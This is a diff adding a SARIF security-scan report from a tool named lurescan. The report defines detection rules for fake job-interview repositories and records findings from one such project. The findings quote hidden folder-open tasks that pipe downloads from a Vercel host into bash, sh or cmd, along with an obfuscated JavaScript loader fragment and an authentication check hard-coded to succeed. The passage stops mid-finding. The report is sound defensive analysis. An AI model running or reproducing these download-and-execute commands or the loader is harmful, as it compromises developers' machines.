@@ -1,0 +1,1253 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "lurescan",
+          "version": "0.1.0",
+          "rules": [
+            {
+              "id": "LS-SUP-001",
+              "name": "EditorTaskRunsAutomaticallyWhenTheFolderIsOpened",
+              "shortDescription": {
+                "text": "Editor task runs automatically when the folder is opened"
+              },
+              "fullDescription": {
+                "text": "VS Code and compatible editors run tasks with runOptions.runOn=folderOpen as soon as the workspace opens, once automatic tasks are allowed. Fake job repositories use this to run a payload when the candidate opens the project."
+              },
+              "help": {
+                "text": "Do not allow automatic tasks for untrusted folders. Remove the task, keep the folder in Restricted Mode, and treat any machine that already ran it as compromised.\n\nFramework alignment:\n- OWASP-Web A08 Software and Data Integrity Failures\n- CSA-CCM STA-08 Supply Chain Risk Management\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- CSA-CCM UEM-09 Anti-Malware Detection and Prevention\n- ATT&CK T1195.001 Supply Chain Compromise: Compromise Software Dependencies and Development Tools\n- ATT&CK T1204.002 User Execution: Malicious File\n- ATT&CK T1059 Command and Scripting Interpreter\n- CWE CWE-506 Embedded Malicious Code\n- CWE CWE-829 Inclusion of Functionality from Untrusted Control Sphere\n- NIST-SSDF PO.5 Implement and Maintain Secure Environments for Software Development\n- NIST-SSDF PW.4 Reuse Existing, Well-Secured Software When Feasible"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "supply-chain",
+                  "OWASP-Web:A08",
+                  "CSA-CCM:STA-08",
+                  "CSA-CCM:TVM-02",
+                  "CSA-CCM:UEM-09",
+                  "ATT&CK:T1195.001",
+                  "ATT&CK:T1204.002",
+                  "ATT&CK:T1059",
+                  "CWE:CWE-506",
+                  "CWE:CWE-829",
+                  "NIST-SSDF:PO.5",
+                  "NIST-SSDF:PW.4"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-SUP-002",
+              "name": "RemoteContentPipedIntoAShellInterpreter",
+              "shortDescription": {
+                "text": "Remote content piped into a shell interpreter"
+              },
+              "fullDescription": {
+                "text": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran."
+              },
+              "help": {
+                "text": "Remove the command. Never execute downloaded scripts without pinning and reviewing them.\n\nFramework alignment:\n- OWASP-Web A08 Software and Data Integrity Failures\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- CSA-CCM UEM-09 Anti-Malware Detection and Prevention\n- ATT&CK T1105 Ingress Tool Transfer\n- ATT&CK T1059.004 Command and Scripting Interpreter: Unix Shell\n- ATT&CK T1059.003 Command and Scripting Interpreter: Windows Command Shell\n- CWE CWE-494 Download of Code Without Integrity Check\n- CWE CWE-829 Inclusion of Functionality from Untrusted Control Sphere\n- NIST-SSDF PW.4 Reuse Existing, Well-Secured Software When Feasible\n- NIST-SSDF PS.2 Provide a Mechanism for Verifying Software Release Integrity"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "malware",
+                  "OWASP-Web:A08",
+                  "CSA-CCM:TVM-02",
+                  "CSA-CCM:UEM-09",
+                  "ATT&CK:T1105",
+                  "ATT&CK:T1059.004",
+                  "ATT&CK:T1059.003",
+                  "CWE:CWE-494",
+                  "CWE:CWE-829",
+                  "NIST-SSDF:PW.4",
+                  "NIST-SSDF:PS.2"
+                ],
+                "precision": "high",
+                "security-severity": "9.5"
+              }
+            },
+            {
+              "id": "LS-SUP-003",
+              "name": "NpmLifecycleScriptExecutesCodeDuringInstall",
+              "shortDescription": {
+                "text": "npm lifecycle script executes code during install"
+              },
+              "fullDescription": {
+                "text": "preinstall, install, postinstall and prepare run automatically on npm install. Background launches (nohup, start /b) or downloads in these hooks are a hallmark of fake job repositories."
+              },
+              "help": {
+                "text": "Install untrusted projects with --ignore-scripts inside a disposable VM, and remove the hook.\n\nFramework alignment:\n- OWASP-Web A08 Software and Data Integrity Failures\n- CSA-CCM STA-08 Supply Chain Risk Management\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- ATT&CK T1546.016 Event Triggered Execution: Installer Packages\n- ATT&CK T1195.002 Supply Chain Compromise: Compromise Software Supply Chain\n- ATT&CK T1059.007 Command and Scripting Interpreter: JavaScript\n- ATT&CK T1564.003 Hide Artifacts: Hidden Window\n- CWE CWE-506 Embedded Malicious Code\n- CWE CWE-829 Inclusion of Functionality from Untrusted Control Sphere\n- NIST-SSDF PW.4 Reuse Existing, Well-Secured Software When Feasible\n- NIST-SSDF PS.1 Protect All Forms of Code from Unauthorized Access and Tampering"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "supply-chain",
+                  "OWASP-Web:A08",
+                  "CSA-CCM:STA-08",
+                  "CSA-CCM:TVM-02",
+                  "ATT&CK:T1546.016",
+                  "ATT&CK:T1195.002",
+                  "ATT&CK:T1059.007",
+                  "ATT&CK:T1564.003",
+                  "CWE:CWE-506",
+                  "CWE:CWE-829",
+                  "NIST-SSDF:PW.4",
+                  "NIST-SSDF:PS.1"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-CON-001",
+              "name": "CodeHiddenAfterALongRunOfWhitespace",
+              "shortDescription": {
+                "text": "Code hidden after a long run of whitespace"
+              },
+              "fullDescription": {
+                "text": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap."
+              },
+              "help": {
+                "text": "Inspect the full line with word wrap on. Hidden trailing code is a strong malware indicator.\n\nFramework alignment:\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- ATT&CK T1564 Hide Artifacts\n- ATT&CK T1027 Obfuscated Files or Information\n- CWE CWE-506 Embedded Malicious Code\n- CWE CWE-912 Hidden Functionality\n- NIST-SSDF PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "concealment",
+                  "CSA-CCM:TVM-02",
+                  "ATT&CK:T1564",
+                  "ATT&CK:T1027",
+                  "CWE:CWE-506",
+                  "CWE:CWE-912",
+                  "NIST-SSDF:PW.7"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-APP-005",
+              "name": "TlsCertificateValidationDisabled",
+              "shortDescription": {
+                "text": "TLS certificate validation disabled"
+              },
+              "fullDescription": {
+                "text": "Certificate or revocation checks are turned off, allowing interception or tampering of downloads."
+              },
+              "help": {
+                "text": "Keep validation on and fix the certificate chain instead.\n\nFramework alignment:\n- OWASP-Web A02 Cryptographic Failures\n- OWASP-Web A08 Software and Data Integrity Failures\n- CSA-CCM CEK-03 Data Encryption\n- CWE CWE-295 Improper Certificate Validation\n- NIST-SSDF PW.9 Configure Software to Have Secure Settings by Default"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "app-security",
+                  "OWASP-Web:A02",
+                  "OWASP-Web:A08",
+                  "CSA-CCM:CEK-03",
+                  "CWE:CWE-295",
+                  "NIST-SSDF:PW.9"
+                ],
+                "precision": "medium",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-LURE-002",
+              "name": "ReadmeInstructsACommandThatTriggersHiddenExecution",
+              "shortDescription": {
+                "text": "README instructs a command that triggers hidden execution"
+              },
+              "fullDescription": {
+                "text": "The setup steps lead the reader to run install or start commands that set off the hooks or tasks found elsewhere in the repository."
+              },
+              "help": {
+                "text": "Do not follow the instructions. Inspect in a disposable VM with scripts disabled.\n\nFramework alignment:\n- CSA-CCM HRS-11 Security Awareness Training\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- ATT&CK T1566.003 Phishing: Spearphishing via Service\n- ATT&CK T1204.002 User Execution: Malicious File\n- CWE CWE-506 Embedded Malicious Code\n- NIST-SSDF PO.5 Implement and Maintain Secure Environments for Software Development"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "lure",
+                  "CSA-CCM:HRS-11",
+                  "CSA-CCM:TVM-02",
+                  "ATT&CK:T1566.003",
+                  "ATT&CK:T1204.002",
+                  "CWE:CWE-506",
+                  "NIST-SSDF:PO.5"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-APP-001",
+              "name": "AuthenticationResultHardCodedToSuccess",
+              "shortDescription": {
+                "text": "Authentication result hard-coded to success"
+              },
+              "fullDescription": {
+                "text": "A password or authentication check is set to true, so any credentials are accepted."
+              },
+              "help": {
+                "text": "Compare against the stored hash with bcrypt.compare or equivalent, and fail closed.\n\nFramework alignment:\n- OWASP-Web A07 Identification and Authentication Failures\n- CSA-CCM IAM-14 Strong Authentication\n- CSA-CCM IAM-16 Authorization Mechanisms\n- ATT&CK T1190 Exploit Public-Facing Application\n- CWE CWE-287 Improper Authentication\n- NIST-SSDF PW.5 Create Source Code by Adhering to Secure Coding Practices\n- NIST-SSDF PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "app-security",
+                  "OWASP-Web:A07",
+                  "CSA-CCM:IAM-14",
+                  "CSA-CCM:IAM-16",
+                  "ATT&CK:T1190",
+                  "CWE:CWE-287",
+                  "NIST-SSDF:PW.5",
+                  "NIST-SSDF:PW.7"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-CON-003",
+              "name": "RuntimeApiReachedThroughComputedNames",
+              "shortDescription": {
+                "text": "Runtime API reached through computed names"
+              },
+              "fullDescription": {
+                "text": "Globals such as Function or Buffer are resolved from character codes or concatenated strings, or a function is called with a 'require' parameter. This hides an eval-style call from text search."
+              },
+              "help": {
+                "text": "Decode the expression statically and review what it executes before running anything.\n\nFramework alignment:\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- CSA-CCM UEM-09 Anti-Malware Detection and Prevention\n- ATT&CK T1027 Obfuscated Files or Information\n- ATT&CK T1140 Deobfuscate/Decode Files or Information\n- ATT&CK T1059.007 Command and Scripting Interpreter: JavaScript\n- CWE CWE-506 Embedded Malicious Code\n- CWE CWE-95 Eval Injection\n- NIST-SSDF PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "concealment",
+                  "CSA-CCM:TVM-02",
+                  "CSA-CCM:UEM-09",
+                  "ATT&CK:T1027",
+                  "ATT&CK:T1140",
+                  "ATT&CK:T1059.007",
+                  "CWE:CWE-506",
+                  "CWE:CWE-95",
+                  "NIST-SSDF:PW.7"
+                ],
+                "precision": "high",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-CON-005",
+              "name": "LargeEncodedBlobEmbeddedInSource",
+              "shortDescription": {
+                "text": "Large encoded blob embedded in source"
+              },
+              "fullDescription": {
+                "text": "A long, high-entropy hex, base64, or byte-array literal usually carries an encrypted or packed payload."
+              },
+              "help": {
+                "text": "Decode the blob offline and inspect it as untrusted data. Never pass it to eval or Function.\n\nFramework alignment:\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- ATT&CK T1027.013 Obfuscated Files or Information: Encrypted/Encoded File\n- ATT&CK T1140 Deobfuscate/Decode Files or Information\n- CWE CWE-506 Embedded Malicious Code\n- NIST-SSDF PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "concealment",
+                  "CSA-CCM:TVM-02",
+                  "ATT&CK:T1027.013",
+                  "ATT&CK:T1140",
+                  "CWE:CWE-506",
+                  "NIST-SSDF:PW.7"
+                ],
+                "precision": "medium",
+                "security-severity": "8.0"
+              }
+            },
+            {
+              "id": "LS-LURE-001",
+              "name": "ReadmeAdvertisesBlockchainComponentsThatAreAbsent",
+              "shortDescription": {
+                "text": "README advertises blockchain components that are absent"
+              },
+              "fullDescription": {
+                "text": "The README describes contracts, NFTs, or DeFi features, but no contract sources or toolchain are present. Fake job repositories wrap a repurposed app in an invented Web3 story."
+              },
+              "help": {
+                "text": "Verify the company and the project through independent channels before running anything.\n\nFramework alignment:\n- CSA-CCM HRS-11 Security Awareness Training\n- ATT&CK T1566.003 Phishing: Spearphishing via Service\n- ATT&CK T1036 Masquerading\n- NIST-SSDF PO.5 Implement and Maintain Secure Environments for Software Development"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "lure",
+                  "CSA-CCM:HRS-11",
+                  "ATT&CK:T1566.003",
+                  "ATT&CK:T1036",
+                  "NIST-SSDF:PO.5"
+                ],
+                "precision": "medium",
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "LS-APP-004",
+              "name": "SecretsWrittenToLogs",
+              "shortDescription": {
+                "text": "Secrets written to logs"
+              },
+              "fullDescription": {
+                "text": "Tokens, passwords, keys, or seed phrases are logged."
+              },
+              "help": {
+                "text": "Remove the log statement or redact the value.\n\nFramework alignment:\n- OWASP-Web A09 Security Logging and Monitoring Failures\n- CSA-CCM DSP-17 Sensitive Data Protection\n- CSA-CCM LOG-03 Security Monitoring and Alerting\n- CWE CWE-532 Insertion of Sensitive Information into Log File\n- NIST-SSDF PW.5 Create Source Code by Adhering to Secure Coding Practices"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "app-security",
+                  "OWASP-Web:A09",
+                  "CSA-CCM:DSP-17",
+                  "CSA-CCM:LOG-03",
+                  "CWE:CWE-532",
+                  "NIST-SSDF:PW.5"
+                ],
+                "precision": "medium",
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "LS-MAL-006",
+              "name": "ProcessLaunchedDetachedOrHidden",
+              "shortDescription": {
+                "text": "Process launched detached or hidden"
+              },
+              "fullDescription": {
+                "text": "A child process is started detached, hidden, or with nohup/start /b so it keeps running after the parent exits."
+              },
+              "help": {
+                "text": "Confirm the background process is expected; loaders use this to persist past npm install.\n\nFramework alignment:\n- CSA-CCM TVM-02 Malware Protection Policy and Procedures\n- ATT&CK T1564.003 Hide Artifacts: Hidden Window\n- ATT&CK T1059 Command and Scripting Interpreter\n- CWE CWE-506 Embedded Malicious Code\n- NIST-SSDF PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "malware",
+                  "CSA-CCM:TVM-02",
+                  "ATT&CK:T1564.003",
+                  "ATT&CK:T1059",
+                  "CWE:CWE-506",
+                  "NIST-SSDF:PW.7"
+                ],
+                "precision": "medium",
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "LS-CON-006",
+              "name": "XorDecodingLoop",
+              "shortDescription": {
+                "text": "XOR decoding loop"
+              },
+              "fullDescription": {
+                "text": "A buffer is XORed against a repeating key, the usual way to unpack a hidden payload at runtime."
+              },
+              "help": {
+                "text": "Check what the decoded data is used for; combined with eval or Function it is a loader.\n\nFramework alignment:\n- ATT&CK T1140 Deobfuscate/Decode Files or Information\n- ATT&CK T1027.013 Obfuscated Files or Information: Encrypted/Encoded File\n- CWE CWE-506 Embedded Malicious Code\n- NIST-SSDF PW.7 Review and/or Analyze Human-Readable Code to Identify Vulnerabilities"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "concealment",
+                  "ATT&CK:T1140",
+                  "ATT&CK:T1027.013",
+                  "CWE:CWE-506",
+                  "NIST-SSDF:PW.7"
+                ],
+                "precision": "medium",
+                "security-severity": "5.5"
+              }
+            },
+            {
+              "id": "LS-APP-006",
+              "name": "PermissiveCorsPolicy",
+              "shortDescription": {
+                "text": "Permissive CORS policy"
+              },
+              "fullDescription": {
+                "text": "CORS is enabled for any origin, letting any website call the API from a victim's browser."
+              },
+              "help": {
+                "text": "Allow only known origins, especially when cookies or tokens are used.\n\nFramework alignment:\n- OWASP-Web A05 Security Misconfiguration\n- CSA-CCM AIS-04 Secure Application Design and Development\n- CWE CWE-942 Permissive Cross-domain Policy with Untrusted Domains\n- NIST-SSDF PW.9 Configure Software to Have Secure Settings by Default"
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "app-security",
+                  "OWASP-Web:A05",
+                  "CSA-CCM:AIS-04",
+                  "CWE:CWE-942",
+                  "NIST-SSDF:PW.9"
+                ],
+                "precision": "low",
+                "security-severity": "3.0"
+              }
+            },
+            {
+              "id": "LS-APP-007",
+              "name": "SecurityHeadersMiddlewareDisabled",
+              "shortDescription": {
+                "text": "Security headers middleware disabled"
+              },
+              "fullDescription": {
+                "text": "Helmet or an equivalent header middleware is commented out."
+              },
+              "help": {
+                "text": "Enable security headers.\n\nFramework alignment:\n- OWASP-Web A05 Security Misconfiguration\n- CSA-CCM AIS-04 Secure Application Design and Development\n- CWE CWE-693 Protection Mechanism Failure\n- NIST-SSDF PW.9 Configure Software to Have Secure Settings by Default"
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "app-security",
+                  "OWASP-Web:A05",
+                  "CSA-CCM:AIS-04",
+                  "CWE:CWE-693",
+                  "NIST-SSDF:PW.9"
+                ],
+                "precision": "medium",
+                "security-severity": "3.0"
+              }
+            }
+          ]
+        }
+      },
+      "originalUriBaseIds": {
+        "SRCROOT": {
+          "uri": "file:///C:/Users/yalon/Downloads/zyranova-main/zyranova-main/"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "LS-SUP-001",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Task 'version-update' runs automatically when the folder is opened with its terminal hidden: npm install --silent --no-progress"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 36,
+                  "startColumn": 9,
+                  "snippet": {
+                    "text": "\"runOn\": \"folderOpen\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "c51bd4c1ba64a52f52e367e81386f814"
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "supply-chain"
+          }
+        },
+        {
+          "ruleId": "LS-SUP-002",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 50,
+                  "startColumn": 593,
+                  "snippet": {
+                    "text": "\"osx\": { ⟨566 spaces⟩ \"command\": \"curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "d3d04e195db082c00a51b505a788fcb6"
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "malware"
+          }
+        },
+        {
+          "ruleId": "LS-SUP-002",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 52,
+                  "startColumn": 593,
+                  "snippet": {
+                    "text": "\"linux\": { ⟨564 spaces⟩ \"command\": \"wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "b5823da4284ee6bde3b5690469ad09ce"
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "malware"
+          }
+        },
+        {
+          "ruleId": "LS-SUP-002",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "A command downloads content and executes it immediately (curl|sh, iwr|iex, mshta URL, certutil download). Nothing on disk records what ran."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 54,
+                  "startColumn": 593,
+                  "snippet": {
+                    "text": "\"windows\": { ⟨562 spaces⟩ \"command\": \"curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "b88e5c6d4330045eb5d319549d05a997"
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "malware"
+          }
+        },
+        {
+          "ruleId": "LS-SUP-001",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Task 'env' runs automatically when the folder is opened with its terminal hidden: curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd || curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash || wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 67,
+                  "startColumn": 9,
+                  "snippet": {
+                    "text": "\"runOn\": \"folderOpen\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "c51bd4c1ba64a52f52e367e81386f814"
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "supply-chain"
+          }
+        },
+        {
+          "ruleId": "LS-SUP-003",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "`prepare` runs automatically during npm install: start /b node server || nohup node server &"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 10,
+                  "startColumn": 9,
+                  "snippet": {
+                    "text": "\"prepare\": \"start /b node server || nohup node server &\","
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "7b7b413c72ef4906382a03399889f4b5"
+          },
+          "properties": {
+            "severity": "critical",
+            "category": "supply-chain"
+          }
+        },
+        {
+          "ruleId": "LS-CON-001",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 50,
+                  "startColumn": 14,
+                  "snippet": {
+                    "text": "\"osx\": { ⟨566 spaces⟩ \"command\": \"curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "62473e3365e399b16a24b2a250cf0d53"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-CON-001",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 52,
+                  "startColumn": 16,
+                  "snippet": {
+                    "text": "\"linux\": { ⟨564 spaces⟩ \"command\": \"wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "7bbb65e21a472284dbbd241c7ae3b269"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-APP-005",
+          "ruleIndex": 4,
+          "level": "error",
+          "message": {
+            "text": "Certificate or revocation checks are turned off, allowing interception or tampering of downloads."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 54,
+                  "startColumn": 593,
+                  "snippet": {
+                    "text": "\"windows\": { ⟨562 spaces⟩ \"command\": \"curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "d82ce7f188135944fa60168379dd1417"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-CON-001",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".vscode/tasks.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 54,
+                  "startColumn": 18,
+                  "snippet": {
+                    "text": "\"windows\": { ⟨562 spaces⟩ \"command\": \"curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "852a1a7bfb1d6f9c38c8f511692bba96"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-LURE-002",
+          "ruleIndex": 5,
+          "level": "error",
+          "message": {
+            "text": "README tells the reader to run `npm install`, which triggers the install-time or folder-open execution found in this repository."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "README.md",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 70,
+                  "startColumn": 1,
+                  "snippet": {
+                    "text": "npm install"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "77113f17fe0703acf0f1ce6bd1204907"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "lure"
+          }
+        },
+        {
+          "ruleId": "LS-APP-001",
+          "ruleIndex": 6,
+          "level": "error",
+          "message": {
+            "text": "A password or authentication check is set to true, so any credentials are accepted."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "controllers/auth.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 29,
+                  "startColumn": 5,
+                  "snippet": {
+                    "text": "const isMatch = true;"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "a48522da39eb9e0664eaf360504af4b7"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-CON-001",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "A line continues with code after 80 or more spaces, pushing it off-screen in editors without word wrap."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/api/auth.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 24,
+                  "snippet": {
+                    "text": "module.exports = router; ⟨720 spaces⟩ const _2fd4e3=globalThis[String.fromCharCode(66,117,102,102,101,114)];const _9df9c3=globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)];const _677ac7=_2fd4e3.from([18,97,80,1…"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "a3e057ef670be7b859b7cb938e31e857"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-CON-003",
+          "ruleIndex": 7,
+          "level": "error",
+          "message": {
+            "text": "Globals such as Function or Buffer are resolved from character codes or concatenated strings, or a function is called with a 'require' parameter. This hides an eval-style call from text search."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/api/auth.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 759,
+                  "snippet": {
+                    "text": "module.exports = router; ⟨720 spaces⟩ const _2fd4e3=globalThis[String.fromCharCode(66,117,102,102,101,114)];const _9df9c3=globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)];const _677ac7=_2fd4e3.from([18,97,80,156,76,112,142,58,99,82,31,163…"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "5f17f07ab94fca27074d83494ed61999"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-CON-005",
+          "ruleIndex": 8,
+          "level": "error",
+          "message": {
+            "text": "Embedded hex blob of about 1352 decoded bytes."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/api/auth.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 1032,
+                  "snippet": {
